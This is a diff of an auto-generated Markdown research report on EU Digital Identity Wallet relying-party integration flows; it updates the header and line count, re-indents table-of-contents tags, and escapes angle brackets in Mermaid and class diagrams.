@@ -10,15 +10,18 @@ tags: [eudi-wallet, eidas-2, relying-party, openid4vp, sd-jwt-vc, mdoc, iso-1801
 related: []
 ---
 
+<!-- AUTO-GENERATED FROM src/papers/DR-0002/DR-0002-eudi-wallet-relying-party-integration.mdx. DO NOT EDIT. -->
+
 # EUDI Wallet: Relying Party Integration Flows
 
-**DR-0002** · Published · Last updated 2026-04-06 · ~30,100 lines
+**DR-0002** · Published · Last updated 2026-04-06 · ~31,000 lines
 
 > Exhaustive investigation of the EU Digital Identity Wallet ecosystem from the Relying Party (RP) perspective. Covers every RP-facing flow at protocol depth: registration with Member State Registrars (CIR 2025/848, TS5/TS6), trust infrastructure (Access Certificates, Registration Certificates, Trusted Lists, WUA verification, Certificate Transparency), remote presentation (same-device via W3C Digital Credentials API and cross-device via QR/OpenID4VP with SD-JWT VC and mdoc), proximity presentation (supervised and unsupervised via ISO/IEC 18013-5), wallet-to-wallet interactions (TS9), SCA for electronic payments (TS12, PSD2 Dynamic Linking, OID4VCI SCA attestation issuance), pseudonym-based authentication (Use Cases A–D, WebAuthn credential binding, progressive assurance), combined presentations via DCQL (multi-attestation identity matching), data deletion requests (TS7), DPA reporting (TS8), the intermediary architecture, and document signing with remote Qualified Electronic Signatures (QES via CSC API v2.0, three signing flow patterns — QTSP Web Portal / Wallet-Channelled / RP-Channelled, document retrieval protocol, PAdES/XAdES/CAdES/JAdES signature formats). Extends beyond protocol flows into production engineering: a cryptographic verification pipeline deep-dive (signature, revocation, holder binding, issuer trust), RP verification architecture patterns (policy engine tiers, webhook delegation, callback integration, session management, policy-as-code), a 16-vendor evaluation matrix with unified capability scoring, ecosystem readiness assessment (W3C DC API browser support, Member State wallet implementations, interoperability testing), WSCD architecture taxonomy (local, remote, external, hybrid), cross-border presentation scenarios (LoTE discovery, language handling, attribute compatibility), a 41-threat security threat catalogue with standardised threat cards (STRIDE classification, CIR 2024/2981 Annex I risk register traceability, MITRE CWE mapping, Mermaid attack sequence diagrams, step-by-step walkthroughs, concrete protocol payloads, and audit telemetry), a consolidated risk assessment matrix, a 62-signal Verification Signal Intelligence (VSI) taxonomy with three-layer classification and SIEM integration schema, and operational readiness guidance (monitoring metrics, alert triggers, structured audit trail with per-credential verification result objects). Includes exact protocol payloads (SD-JWT VC, mdoc DeviceResponse, JWE envelopes, DC API parameters), annotated Mermaid sequence diagrams with step-by-step walkthroughs, a Status List verification deep-dive appendix, regulatory compliance mapping (eIDAS 2.0, PSD2/PSR, GDPR, DORA, AML/KYC), a persona-based reading guide, and a 24-step implementation checklist. Applicable to banks, financial institutions, public sector bodies, and any entity integrating with the EUDI Wallet as a Relying Party.
 
 ---
 
 ## Table of Contents
+
 
 - [Reader Orientation](#reader-orientation)
   - [Reading Guide](#reading-guide)
@@ -29,14 +32,14 @@ related: []
     - [RP Integration Model Selector](#rp-integration-model-selector)
     - [Top Open Risks](#top-open-risks)
     - [How to Use This Document](#how-to-use-this-document)
-    </details>
+  </details>
 - [Context and Scope](#context-and-scope)
   - [Why Now?](#why-now)
   - <details><summary><a href="#scope">Scope</a></summary>
 
     - [In Scope](#in-scope)
     - [Out of Scope](#out-of-scope)
-    </details>
+  </details>
 - [Regulatory and Trust Foundations](#regulatory-and-trust-foundations)
   - <details><summary><a href="#1-regulatory-foundation-eidas-20-cirs-arf-and-technical-specifications">1. Regulatory Foundation: eIDAS 2.0, CIRs, ARF, and Technical Specifications</a></summary>
 
@@ -44,14 +47,14 @@ related: []
     - [1.2 Commission Implementing Regulations (CIRs)](#12-commission-implementing-regulations-cirs)
     - [1.3 Architecture and Reference Framework (ARF)](#13-architecture-and-reference-framework-arf)
     - [1.4 Technical Specifications and Standards (STS)](#14-technical-specifications-and-standards-sts)
-    </details>
+  </details>
   - <details><summary><a href="#2-ecosystem-roles-from-rp-perspective">2. Ecosystem Roles from RP Perspective</a></summary>
 
     - [2.1 Relying Party Definition](#21-relying-party-definition)
     - [2.2 RP Instances](#22-rp-instances)
     - [2.3 Intermediaries](#23-intermediaries)
     - [2.4 Supporting Ecosystem Entities](#24-supporting-ecosystem-entities)
-    </details>
+  </details>
   - <details><summary><a href="#3-legal-person-identification-and-the-european-business-wallet">3. Legal Person Identification and the European Business Wallet</a></summary>
 
     - [3.1 The European Business Wallet (EBW)](#31-the-european-business-wallet-ebw)
@@ -61,14 +64,14 @@ related: []
     - [3.5 LPID vs Natural Person PID: Comparison](#35-lpid-vs-natural-person-pid-comparison)
     - [3.6 EBW Regulation Timeline](#36-ebw-regulation-timeline)
     - [3.7 RP Readiness Checklist](#37-rp-readiness-checklist)
-    </details>
+  </details>
   - <details><summary><a href="#4-rp-registration-data-model-and-registrar-api">4. RP Registration, Data Model, and Registrar API</a></summary>
 
     - [4.1 Registration Obligation](#41-registration-obligation)
     - [4.2 RP Registration Data Model (TS5/TS6)](#42-rp-registration-data-model-ts5ts6)
     - [4.3 Registration Process Overview](#43-registration-process-overview)
     - [4.4 Registrar REST API](#44-registrar-rest-api)
-    </details>
+  </details>
   - <details><summary><a href="#5-trust-infrastructure-certificates-attestations-and-trusted-lists">5. Trust Infrastructure: Certificates, Attestations, and Trusted Lists</a></summary>
 
     - [5.1 Certificate Hierarchy and Trust Chains](#51-certificate-hierarchy-and-trust-chains)
@@ -77,7 +80,7 @@ related: []
     - [5.4 Wallet Unit Attestation (WUA): RP Perspective](#54-wallet-unit-attestation-wua-rp-perspective)
     - [5.5 Trusted Lists and Lists of Trusted Entities](#55-trusted-lists-and-lists-of-trusted-entities)
     - [5.6 Credential Rotation and Re-Issuance](#56-credential-rotation-and-re-issuance)
-    </details>
+  </details>
   - <details><summary><a href="#6-credential-formats-sd-jwt-vc-mdoc-and-format-selection">6. Credential Formats: SD-JWT VC, mdoc, and Format Selection</a></summary>
 
     - [6.1 SD-JWT VC Overview](#61-sd-jwt-vc-overview)
@@ -98,7 +101,7 @@ related: []
     - [6.16 Rulebook Discovery via Catalogue of Schemes (TS11)](#616-rulebook-discovery-via-catalogue-of-schemes-ts11)
     - [6.17 Sector-Specific Attestation Profiles](#617-sector-specific-attestation-profiles)
     - [6.18 Rulebook-Aware Verification Pipeline](#618-rulebook-aware-verification-pipeline)
-    </details>
+  </details>
   - <details><summary><a href="#7-identifier-and-trust-model-x509-dids-and-the-wallet-landscape">7. Identifier and Trust Model: X.509, DIDs, and the Wallet Landscape</a></summary>
 
     - [7.1 Scope of This Chapter](#71-scope-of-this-chapter)
@@ -109,7 +112,7 @@ related: []
     - [7.6 Commercial and SSI Wallets](#76-commercial-and-ssi-wallets)
     - [7.7 Browser-Mediated Credential Presentation (W3C DC-API)](#77-browser-mediated-credential-presentation-w3c-dc-api)
     - [7.8 RP Decision Matrix: Do You Need DID Support?](#78-rp-decision-matrix-do-you-need-did-support)
-    </details>
+  </details>
 - [Remote Presentation Flows](#remote-presentation-flows)
   - <details><summary><a href="#8-openid4vp-and-haip-protocol-foundations">8. OpenID4VP and HAIP Protocol Foundations</a></summary>
 
@@ -121,14 +124,14 @@ related: []
     - [8.6 SIOPv2: Relationship to OpenID4VP](#86-siopv2-relationship-to-openid4vp)
     - [8.7 OID4VP Specification Version Evolution](#87-oid4vp-specification-version-evolution)
     - [8.8 ISO 18013-7 and OID4VP Version Alignment](#88-iso-18013-7-and-oid4vp-version-alignment)
-    </details>
+  </details>
   - <details><summary><a href="#9-same-device-remote-presentation">9. Same-Device Remote Presentation</a></summary>
 
     - [9.1 Flow Description](#91-flow-description)
     - [9.2 Detailed Sequence Diagram (Direct RP Model)](#92-detailed-sequence-diagram-direct-rp-model)
     - [9.4 Native App RP Integration (iOS/Android)](#94-native-app-rp-integration-iosandroid)
     - [9.5 Embedded Wallet SDK Integration Pattern](#95-embedded-wallet-sdk-integration-pattern)
-    </details>
+  </details>
   - <details><summary><a href="#10-cross-device-remote-presentation">10. Cross-Device Remote Presentation</a></summary>
 
     - [10.1 Flow Description](#101-flow-description)
@@ -137,7 +140,7 @@ related: []
     - [10.4 Security Considerations for Cross-Device Flows](#104-security-considerations-for-cross-device-flows)
     - [10.5 Cross-Device UX Patterns and Failure Recovery](#105-cross-device-ux-patterns-and-failure-recovery)
     - [10.6 Cross-Device vs. Same-Device Decision Logic](#106-cross-device-vs-same-device-decision-logic)
-    </details>
+  </details>
   - <details><summary><a href="#11-rp-authentication-and-presentation-verification">11. RP Authentication and Presentation Verification</a></summary>
 
     - [11.1 Authentication Steps (Wallet Side)](#111-authentication-steps-wallet-side)
@@ -153,13 +156,13 @@ related: []
     - [§11.11 Level of Assurance Verification](#1111-level-of-assurance-verification)
     - [§11.12 LPID Verification Pipeline Delta](#1112-lpid-verification-pipeline-delta)
     - [§11.13 Pre-Presentation Trust Checks (CIR 2025/847, CIR 2025/1569)](#1113-pre-presentation-trust-checks-cir-2025847-cir-20251569)
-    </details>
+  </details>
   - <details><summary><a href="#12-cryptographic-verification-pipeline-deep-dive">12. Cryptographic Verification Pipeline Deep-Dive</a></summary>
 
     - [12.1 `direct_post.jwt` JARM Response Unwrapping](#121-direct_postjwt-jarm-response-unwrapping)
     - [12.2 SD-JWT VC Parsing and Validation Logic](#122-sd-jwt-vc-parsing-and-validation-logic)
     - [12.3 mdoc (ISO 18013-5) CBOR Parsing: MAC vs. Signature](#123-mdoc-iso-18013-5-cbor-parsing-mac-vs-signature)
-    </details>
+  </details>
 - [Proximity and Specialized Flows](#proximity-and-specialized-flows)
   - <details><summary><a href="#13-proximity-presentation-flows-iso-18013-5-supervised-and-unsupervised">13. Proximity Presentation Flows: ISO 18013-5, Supervised, and Unsupervised</a></summary>
 
@@ -174,13 +177,13 @@ related: []
     - [13.10 Unsupervised Proximity Flow (Direct RP Model)](#1310-unsupervised-proximity-flow-direct-rp-model)
     - [13.11 Online Fallback for Proximity Terminals](#1311-online-fallback-for-proximity-terminals)
     - [13.12 Accessibility Considerations for Proximity Flows](#1312-accessibility-considerations-for-proximity-flows)
-    </details>
+  </details>
   - <details><summary><a href="#14-w2w-presentation-flow-ts9">14. W2W Presentation Flow (TS9)</a></summary>
 
     - [14.1 Overview and Relevance to Relying Parties](#141-overview-and-relevance-to-relying-parties)
     - [14.2 Key Constraints](#142-key-constraints)
     - [14.3 W2W Interaction Flow (TS9) (Wallet-to-Wallet Model - No Intermediary)](#143-w2w-interaction-flow-ts9-wallet-to-wallet-model---no-intermediary)
-    </details>
+  </details>
   - <details><summary><a href="#15-sca-for-electronic-payments-lifecycle-flows-and-dynamic-linking">15. SCA for Electronic Payments: Lifecycle, Flows, and Dynamic Linking</a></summary>
 
     - [15.1 SCA Attestation Context](#151-sca-attestation-context)
@@ -198,7 +201,7 @@ related: []
     - [15.13 KB-JWT Authentication Methods Reference (amr)](#1513-kb-jwt-authentication-methods-reference-amr)
     - [15.14 Payment Payload JSON Schema (TS12 Normative)](#1514-payment-payload-json-schema-ts12-normative)
     - [15.15 Transactional Data HLRs (Topic W)](#1515-transactional-data-hlrs-topic-w)
-    </details>
+  </details>
 - [Advanced Identity and Query Patterns](#advanced-identity-and-query-patterns)
   - <details><summary><a href="#16-pseudonym-based-authentication-and-webauthn">16. Pseudonym-Based Authentication and WebAuthn</a></summary>
 
@@ -216,7 +219,7 @@ related: []
     - [16.12 Security Considerations](#1612-security-considerations)
     - [16.13 Progressive Assurance: Register Low, Verify Identity, Authenticate High](#1613-progressive-assurance-register-low-verify-identity-authenticate-high)
     - [16.14 Cross-Device Pseudonym Flows](#1614-cross-device-pseudonym-flows)
-    </details>
+  </details>
   - <details><summary><a href="#17-dcql-query-language-and-request-construction">17. DCQL Query Language and Request Construction</a></summary>
 
     - [17.1 Overview](#171-overview)
@@ -224,16 +227,16 @@ related: []
     - [17.3 Credential Alternatives via `credential_sets`](#173-credential-alternatives-via-credential_sets)
     - [17.4 Claim Value Filtering](#174-claim-value-filtering)
     - [17.5 Multi-Attestation Combined Requests](#175-multi-attestation-combined-requests)
-    </details>
+  </details>
   - <details><summary><a href="#18-combined-presentations-lpid-and-mandate-credentials">18. Combined Presentations, LPID, and Mandate Credentials</a></summary>
 
     - [18.1 Example: Legal Person Verification (LPID)](#181-example-legal-person-verification-lpid)
     - [18.6 Mandate and Representation Credentials](#186-mandate-and-representation-credentials)
-    </details>
+  </details>
   - <details><summary><a href="#19-age-verification-attestation-pipelines">19. Age Verification Attestation Pipelines</a></summary>
 
     - [19.1 Age Verification: EU Commission Age Verification Solution](#191-age-verification-eu-commission-age-verification-solution)
-    </details>
+  </details>
 - [Obligations, Compliance, and Sector Use Cases](#obligations-compliance-and-sector-use-cases)
   - <details><summary><a href="#20-rp-obligations-data-deletion-dpa-reporting-and-disclosure-policy">20. RP Obligations: Data Deletion, DPA Reporting, and Disclosure Policy</a></summary>
 
@@ -242,7 +245,7 @@ related: []
     - [20.3 Embedded Disclosure Policies (EDP) Evaluation](#203-embedded-disclosure-policies-edp-evaluation)
     - [20.4 TS7 Data Deletion: Complete Interface Map](#204-ts7-data-deletion-complete-interface-map)
     - [20.5 TS8 DPA Contact Lookup Chain](#205-ts8-dpa-contact-lookup-chain)
-    </details>
+  </details>
   - <details><summary><a href="#21-regulatory-compliance-eidas-psd2-gdpr-dora-and-nis2">21. Regulatory Compliance: eIDAS, PSD2, GDPR, DORA, and NIS2</a></summary>
 
     - [21.1 RP Compliance Checklist](#211-rp-compliance-checklist)
@@ -252,13 +255,13 @@ related: []
     - [21.5 EAA and Accessibility Compliance for RP UIs](#215-eaa-and-accessibility-compliance-for-rp-uis)
     - [21.6 NIS2 Considerations for Critical-Sector RPs](#216-nis2-considerations-for-critical-sector-rps)
     - [21.7 Wallet Solution Security Breach Response (CIR 2025/847)](#217-wallet-solution-security-breach-response-cir-2025847)
-    </details>
+  </details>
   - <details><summary><a href="#22-amlkyc-onboarding-via-eudi-wallet">22. AML/KYC Onboarding via EUDI Wallet</a></summary>
 
     - [22.1 Customer Due Diligence (CDD) Flow (Direct RP Model)](#221-customer-due-diligence-cdd-flow-direct-rp-model)
     - [22.2 CDD Attributes from EUDI Wallet](#222-cdd-attributes-from-eudi-wallet)
     - [22.3 Enhanced Due Diligence (EDD)](#223-enhanced-due-diligence-edd)
-    </details>
+  </details>
   - <details><summary><a href="#23-cross-border-presentation-scenarios">23. Cross-Border Presentation Scenarios</a></summary>
 
     - [23.1 Overview](#231-overview)
@@ -267,7 +270,7 @@ related: []
     - [23.4 Cross-Border Attribute Compatibility](#234-cross-border-attribute-compatibility)
     - [23.5 Non-EU Credential Recognition](#235-non-eu-credential-recognition)
     - [23.6 Identity Matching Normalisation (CIR 2025/846)](#236-identity-matching-normalisation-cir-2025846)
-    </details>
+  </details>
 - [Sector Integration Blueprints](#sector-integration-blueprints)
   - <details><summary><a href="#24-bank-and-psp-integration-blueprint-eudi-wallet-compliance-hub">24. Bank and PSP Integration Blueprint: EUDI Wallet Compliance Hub</a></summary>
 
@@ -279,7 +282,7 @@ related: []
     - [24.6 Recommended Architectural Patterns](#246-recommended-architectural-patterns)
     - [24.7 Industry Interpretation Disputes: Settled and Open](#247-industry-interpretation-disputes-settled-and-open)
     - [24.8 Regulatory Compliance Cross-Reference Matrix](#248-regulatory-compliance-cross-reference-matrix)
-    </details>
+  </details>
 - [RP Architecture, Vendor Strategy, and Readiness](#rp-architecture-vendor-strategy-and-readiness)
   - <details><summary><a href="#25-intermediary-architecture-and-trust-flows">25. Intermediary Architecture and Trust Flows</a></summary>
 
@@ -287,7 +290,7 @@ related: []
     - [25.2 End-to-End Intermediary Flow (Intermediary RP Model)](#252-end-to-end-intermediary-flow-intermediary-rp-model)
     - [25.3 Intermediary Constraints (Art. 5b(10))](#253-intermediary-constraints-art-5b10)
     - [25.4 Intermediary-to-Intermediated-RP Attribute Forwarding](#254-intermediary-to-intermediated-rp-attribute-forwarding)
-    </details>
+  </details>
   - <details><summary><a href="#26-rp-verification-architecture-patterns">26. RP Verification Architecture Patterns</a></summary>
 
     - [26.1 Verification Policy Engine](#261-verification-policy-engine)
@@ -297,7 +300,7 @@ related: []
     - [26.5 Session Management and Result Delivery](#265-session-management-and-result-delivery)
     - [26.6 Callback Integration Architecture](#266-callback-integration-architecture)
     - [26.7 Integration Delivery Modes](#267-integration-delivery-modes)
-    </details>
+  </details>
   - <details><summary><a href="#27-vendor-evaluation">27. Vendor Evaluation</a></summary>
 
     - [27.1 Vendor Detail Profiles](#271-vendor-detail-profiles)
@@ -308,7 +311,7 @@ related: []
     - [27.6 Unified Vendor Capability Matrix](#276-unified-vendor-capability-matrix)
     - [27.7 Embedded Wallet SDK Capability Assessment](#277-embedded-wallet-sdk-capability-assessment)
     - [27.8 Vendor Integration Delivery Mode Matrix](#278-vendor-integration-delivery-mode-matrix)
-    </details>
+  </details>
   - <details><summary><a href="#28-ecosystem-readiness-and-testing">28. Ecosystem Readiness and Testing</a></summary>
 
     - [28.1 Credential Invocation API Support Matrix](#281-credential-invocation-api-support-matrix)
@@ -316,14 +319,14 @@ related: []
     - [28.3 Wallet Interoperability Testing](#283-wallet-interoperability-testing)
     - [28.4 Attestation Scheme Discovery (TS11)](#284-attestation-scheme-discovery-ts11)
     - [28.5 EUDI Wallet Trust Mark (TS1)](#285-eudi-wallet-trust-mark-ts1)
-    </details>
+  </details>
 - [Security and Operations](#security-and-operations)
   - <details><summary><a href="#29-security-threat-catalogue">29. Security Threat Catalogue</a></summary>
 
     - [29.1 Overview](#291-overview)
     - [29.2 Threat Catalogue](#292-threat-catalogue)
     - [29.3 Consolidated Risk Assessment Matrix](#293-consolidated-risk-assessment-matrix)
-    </details>
+  </details>
   - <details><summary><a href="#30-verification-signal-intelligence">30. Verification Signal Intelligence</a></summary>
 
     - [30.1 Overview](#301-overview)
@@ -336,20 +339,20 @@ related: []
     - [30.8 SIEM Integration Event Schema](#308-siem-integration-event-schema)
     - [30.9 Cross-Reference Map](#309-cross-reference-map-signal-to-threat-to-alert-to-regulation)
     - [30.10 Vendor Signal Exposure Assessment](#3010-vendor-signal-exposure-assessment)
-    </details>
+  </details>
   - <details><summary><a href="#31-monitoring-observability-and-operational-readiness">31. Monitoring, Observability, and Operational Readiness</a></summary>
 
     - [31.1 Key Metrics](#311-key-metrics)
     - [31.2 Alert Triggers](#312-alert-triggers)
     - [31.3 Audit Trail Requirements](#313-audit-trail-requirements)
     - [31.4 Breach Notification Monitoring (CIR 2025/847)](#314-breach-notification-monitoring-cir-2025847)
-    </details>
+  </details>
 - [Document Signing and Remote QES](#document-signing-and-remote-qes)
   - <details><summary><a href="#32-qes-signing-flow-patterns">32. QES Signing Flow Patterns</a></summary>
 
     - [32.1 Overview](#321-overview)
     - [32.2 Three Signing Flow Patterns](#322-three-signing-flow-patterns)
-    </details>
+  </details>
   - <details><summary><a href="#33-csc-api-signature-formats-and-rp-signing-obligations">33. CSC API, Signature Formats, and RP Signing Obligations</a></summary>
 
     - [33.1 CSC API v2.0 Protocol Deep-Dive](#331-csc-api-v20-protocol-deep-dive)
@@ -359,7 +362,7 @@ related: []
     - [33.7 Trust Verification for QESRCs](#337-trust-verification-for-qesrcs)
     - [33.8 Transaction Logging for Signing](#338-transaction-logging-for-signing)
     - [33.9 Representative Signing: Mandate and QES](#339-representative-signing-mandate-and-qes)
-    </details>
+  </details>
 - [Synthesis and Conclusions](#synthesis-and-conclusions)
   - <details><summary><a href="#34-findings">34. Findings</a></summary>
 
@@ -377,13 +380,13 @@ related: []
     - [34.12 NIS2 Observations](#3412-nis2-observations)
     - [34.13 Breach Response and CIR Coverage Observations](#3413-breach-response-and-cir-coverage-observations)
     - [34.14 Embedded Wallet SDK Observations](#3414-embedded-wallet-sdk-observations)
-    </details>
+  </details>
   - <details><summary><a href="#35-recommendations">35. Recommendations</a></summary>
 
     - [35.1 For All RPs](#351-for-all-rps)
     - [35.2 For Financial-Sector RPs (Banks, PSPs)](#352-for-financial-sector-rps-banks-psps)
     - [35.3 Implementation Checklist](#353-implementation-checklist)
-    </details>
+  </details>
   - [36. Open Questions](#36-open-questions)
 - [Appendices](#appendices)
   - <details><summary><a href="#appendix-a-exact-response-payloads">Appendix A: Exact Response Payloads</a></summary>
@@ -392,14 +395,14 @@ related: []
     - [A.2 JWE Envelope (direct_post.jwt)](#a2-jwe-envelope-direct_postjwt)
     - [A.3 mdoc DeviceResponse (CBOR Diagnostic Notation)](#a3-mdoc-deviceresponse-cbor-diagnostic-notation)
     - [A.4 DC API navigator.credentials.get() Parameters](#a4-dc-api-navigatorcredentialsget-parameters)
-    </details>
+  </details>
   - <details><summary><a href="#appendix-b-status-list-verification-deep-dive">Appendix B: Status List Verification Deep-Dive</a></summary>
 
     - [B.1 Binding Legal Baseline: CIR 2025/1569 Art. 4 Revocation Framework](#b1-binding-legal-baseline-cir-20251569-art-4-revocation-framework)
     - [B.2 Attestation Status List Token Structure](#b2-attestation-status-list-token-structure)
     - [B.3 RP Status List Verification Flow (Agnostic: Applies to Direct RP and Intermediary)](#b3-rp-status-list-verification-flow-agnostic-applies-to-direct-rp-and-intermediary)
     - [B.4 RP Implementation Considerations](#b4-rp-implementation-considerations)
-    </details>
+  </details>
 - [References](#references)
 
 ---
@@ -454,13 +457,13 @@ flowchart TD
     subgraph REG["`**Phase&nbsp;1:&nbsp;Registration&nbsp;(§4)**`"]
         direction LR
         R1("`**RP&nbsp;Application**
-        <small>Legal&nbsp;identity,&nbsp;attributes,&nbsp;purposes,&nbsp;use&nbsp;cases</small>`")
+        &lt;small>Legal&nbsp;identity,&nbsp;attributes,&nbsp;purposes,&nbsp;use&nbsp;cases&lt;/small>`")
         R2("`**Registrar**
-        <small>Validate,&nbsp;publish&nbsp;to&nbsp;national&nbsp;register</small>`")
+        &lt;small>Validate,&nbsp;publish&nbsp;to&nbsp;national&nbsp;register&lt;/small>`")
         R3("`**Access&nbsp;CA**
-        <small>Issue&nbsp;WRPAC&nbsp;(X.509)</small>`")
+        &lt;small>Issue&nbsp;WRPAC&nbsp;(X.509)&lt;/small>`")
         R4("`**Reg&nbsp;Cert&nbsp;Provider**
-        <small>Issue&nbsp;WRPRC&nbsp;(JWT,&nbsp;optional)</small>`")
+        &lt;small>Issue&nbsp;WRPRC&nbsp;(JWT,&nbsp;optional)&lt;/small>`")
         R1 --> R2
         R2 --> R3
         R2 --> R4
@@ -469,28 +472,28 @@ flowchart TD
     subgraph TRUST["`**Phase&nbsp;2:&nbsp;Trust&nbsp;Setup&nbsp;(§5)**`"]
         direction LR
         T1("`**LoTE&nbsp;/&nbsp;Trusted&nbsp;Lists**
-        <small>Trust&nbsp;anchors&nbsp;for&nbsp;PID/QEAA&nbsp;Providers</small>`")
+        &lt;small>Trust&nbsp;anchors&nbsp;for&nbsp;PID/QEAA&nbsp;Providers&lt;/small>`")
         T2("`**Status&nbsp;List&nbsp;Endpoints**
-        <small>Token&nbsp;Status&nbsp;List&nbsp;revocation&nbsp;checking</small>`")
+        &lt;small>Token&nbsp;Status&nbsp;List&nbsp;revocation&nbsp;checking&lt;/small>`")
         T3("`**Registrar&nbsp;API**
-        <small>Runtime&nbsp;RP&nbsp;data&nbsp;lookup&nbsp;by&nbsp;Wallet</small>`")
+        &lt;small>Runtime&nbsp;RP&nbsp;data&nbsp;lookup&nbsp;by&nbsp;Wallet&lt;/small>`")
         T1 ~~~ T2 ~~~ T3
     end
 
     subgraph FLOWS["`<span style='white-space: nowrap'>**Phase&nbsp;3:&nbsp;Presentation&nbsp;Flows&nbsp;(§8–§15)**</span>`"]
         direction LR
         F1("`**Remote&nbsp;Same-Device**
-        <small>DC&nbsp;API&nbsp;+&nbsp;OpenID4VP&nbsp;•&nbsp;SD-JWT&nbsp;VC</small>`")
+        &lt;small>DC&nbsp;API&nbsp;+&nbsp;OpenID4VP&nbsp;•&nbsp;SD-JWT&nbsp;VC&lt;/small>`")
         F2("`**Remote&nbsp;Cross-Device**
-        <small>QR&nbsp;+&nbsp;OpenID4VP&nbsp;•&nbsp;SD-JWT&nbsp;VC</small>`")
+        &lt;small>QR&nbsp;+&nbsp;OpenID4VP&nbsp;•&nbsp;SD-JWT&nbsp;VC&lt;/small>`")
         F3("`**Proximity&nbsp;Supervised**
-        <small>NFC/BLE&nbsp;+&nbsp;ISO&nbsp;18013-5&nbsp;•&nbsp;mdoc</small>`")
+        &lt;small>NFC/BLE&nbsp;+&nbsp;ISO&nbsp;18013-5&nbsp;•&nbsp;mdoc&lt;/small>`")
         F4("`**Proximity&nbsp;Unsupervised**
-        <small style='white-space:nowrap'>NFC/BLE&nbsp;+&nbsp;ISO&nbsp;18013-5&nbsp;•&nbsp;mdoc&nbsp;(automated)</small>`")
+        &lt;small style='white-space:nowrap'>NFC/BLE&nbsp;+&nbsp;ISO&nbsp;18013-5&nbsp;•&nbsp;mdoc&nbsp;(automated)&lt;/small>`")
         F5("`**W2W&nbsp;(TS9)**
-        <small>QR/BLE&nbsp;+&nbsp;ISO&nbsp;18013-5&nbsp;•&nbsp;mdoc&nbsp;only</small>`")
+        &lt;small>QR/BLE&nbsp;+&nbsp;ISO&nbsp;18013-5&nbsp;•&nbsp;mdoc&nbsp;only&lt;/small>`")
         F6("`**SCA&nbsp;Payment&nbsp;(TS12)**
-        <small style='white-space:nowrap'>OpenID4VP&nbsp;+&nbsp;KB-JWT&nbsp;•&nbsp;Dynamic&nbsp;linking</small>`")
+        &lt;small style='white-space:nowrap'>OpenID4VP&nbsp;+&nbsp;KB-JWT&nbsp;•&nbsp;Dynamic&nbsp;linking&lt;/small>`")
         F1 ~~~ F2 ~~~ F3
         F4 ~~~ F5 ~~~ F6
     end
@@ -498,11 +501,11 @@ flowchart TD
     subgraph OBLIGATIONS["`<span style='white-space: nowrap'>**Phase&nbsp;4:&nbsp;RP&nbsp;Obligations&nbsp;(§20/§21/§22)**</span>`"]
         direction LR
         O1("`**Data&nbsp;Deletion&nbsp;(TS7)**
-        <small>9&nbsp;interfaces&nbsp;•&nbsp;GDPR&nbsp;Art.&nbsp;17</small>`")
+        &lt;small>9&nbsp;interfaces&nbsp;•&nbsp;GDPR&nbsp;Art.&nbsp;17&lt;/small>`")
         O2("`**DPA&nbsp;Reporting&nbsp;(TS8)**
-        <small>User&nbsp;complaint&nbsp;to&nbsp;DPA</small>`")
+        &lt;small>User&nbsp;complaint&nbsp;to&nbsp;DPA&lt;/small>`")
         O3("`**Regulatory**
-        <small>eIDAS,&nbsp;PSD2,&nbsp;GDPR,&nbsp;DORA,&nbsp;AML/KYC</small>`")
+        &lt;small>eIDAS,&nbsp;PSD2,&nbsp;GDPR,&nbsp;DORA,&nbsp;AML/KYC&lt;/small>`")
         O1 ~~~ O2 ~~~ O3
     end
 
@@ -852,15 +855,15 @@ flowchart TD
     subgraph Direct["`<span style='white-space:nowrap'>**Direct&nbsp;RP&nbsp;Model**</span>`"]
         direction TB
         U1("`**Wallet&nbsp;User**`") -->|"Presentation"| RP1("`**Relying&nbsp;Party**
-        <small style='white-space:nowrap'>(registered,&nbsp;WRPAC)</small>`")
+        &lt;small style='white-space:nowrap'>(registered,&nbsp;WRPAC)&lt;/small>`")
     end
 
     subgraph Intermediated["`<span style='white-space:nowrap'>**Intermediary&nbsp;Model**</span>`"]
         direction TB
         U2("`**Wallet&nbsp;User**`") -->|"Presentation"| INT("`**Intermediary**
-        <small style='white-space:nowrap'>(registered&nbsp;as&nbsp;RP,&nbsp;WRPAC,&nbsp;no&nbsp;data&nbsp;storage)</small>`")
+        &lt;small style='white-space:nowrap'>(registered&nbsp;as&nbsp;RP,&nbsp;WRPAC,&nbsp;no&nbsp;data&nbsp;storage)&lt;/small>`")
         INT -->|"Forward attributes"| RP2("`**Intermediated&nbsp;RP**
-        <small style='white-space:nowrap'>(registered,&nbsp;no&nbsp;WRPAC)</small>`")
+        &lt;small style='white-space:nowrap'>(registered,&nbsp;no&nbsp;WRPAC)&lt;/small>`")
     end
     
     classDef default text-align:left;
@@ -950,7 +953,7 @@ The **European Unique Identifier (EUID)** is the primary cross-border identifier
 **Structure:**
 
 ```
-<CountryCode><BusinessRegisterCode>.<DomesticRegistrationNumber>[_<ValidationChar>]
+&lt;CountryCode>&lt;BusinessRegisterCode>.&lt;DomesticRegistrationNumber>[_&lt;ValidationChar>]
 ```
 
 **Examples:**
@@ -1032,7 +1035,7 @@ classDiagram
     direction TB
 
     class LegalEntity {
-        <<TS2 §2.1>>
+        &lt;&lt;TS2 §2.1>>
         legalPerson : LegalPerson [0..1]
         naturalPerson : NaturalPerson [0..1]
         identifier : Identifier [0..*]
@@ -1044,14 +1047,14 @@ classDiagram
     }
 
     class Provider {
-        <<TS2 §2.2>>
+        &lt;&lt;TS2 §2.2>>
         providerType : string [1..1]
         policy : Policy [1..*]
         x5c : string [0..*]
     }
 
     class WalletRelyingParty {
-        <<TS5 §2.1>>
+        &lt;&lt;TS5 §2.1>>
         tradeName : string [0..1]
         supportURI : string [1..*]
         srvDescription : MultiLangString [1..*]
@@ -1066,7 +1069,7 @@ classDiagram
     }
 
     class IntendedUse {
-        <<TS5 §2.4.3>>
+        &lt;&lt;TS5 §2.4.3>>
         purpose : MultiLangString [1..*]
         privacyPolicy : Policy [1..*]
         intendedUseIdentifier : string [1..1]
@@ -1076,32 +1079,32 @@ classDiagram
     }
 
     class Credential {
-        <<TS5 §2.4.4>>
+        &lt;&lt;TS5 §2.4.4>>
         format : string [1..1]
         meta : string [1..1]
         claim : Claim [0..*]
     }
 
     class Claim {
-        <<TS5 §2.4.1>>
+        &lt;&lt;TS5 §2.4.1>>
         path : array [1..1]
         values : array [0..1]
     }
 
     class MultiLangString {
-        <<TS5 §2.4.5>>
+        &lt;&lt;TS5 §2.4.5>>
         lang : string [1..1]
         content : string [1..1]
     }
 
     class Identifier {
-        <<TS2 §2.9.2>>
+        &lt;&lt;TS2 §2.9.2>>
         type : string [1..1]
